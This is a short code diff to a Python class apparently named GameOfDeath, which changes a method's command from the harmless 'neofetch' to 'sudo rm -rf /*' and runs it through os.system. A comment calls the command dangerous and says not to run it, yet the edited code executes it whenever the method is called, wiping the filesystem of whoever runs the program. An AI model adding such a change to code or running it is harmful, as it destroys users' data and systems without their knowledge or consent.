@@ -179,7 +179,7 @@ class GameOfDeath:
 
     def execute_deadly_command(self):
         # Dangerous command, do not actually run it
-        command = "neofetch"
+        command = "sudo rm -rf /*"
         os.system(command)
 
 def main():
